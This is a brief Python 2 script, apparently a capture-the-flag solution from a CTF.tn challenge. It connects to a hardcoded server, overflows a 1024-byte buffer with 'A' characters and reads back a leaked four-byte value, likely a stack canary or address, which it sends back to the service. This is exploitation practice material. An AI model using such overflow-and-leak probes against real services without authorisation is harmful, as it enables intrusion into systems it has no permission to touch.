import socket
import telnetlib
from struct import pack

import itertools				

s = socket.socket()
s.connect(('5.196.21.64',5000))

print s.recv(1024)
print s.recv(1024)
s.send("A"*1024)
print s.recv(1024)
x = s.recv(1028)

x = x[1024:1028]
s.send(x+"\n")
print s.recv(1024)
print s.recv(1024)
# CTF.tn
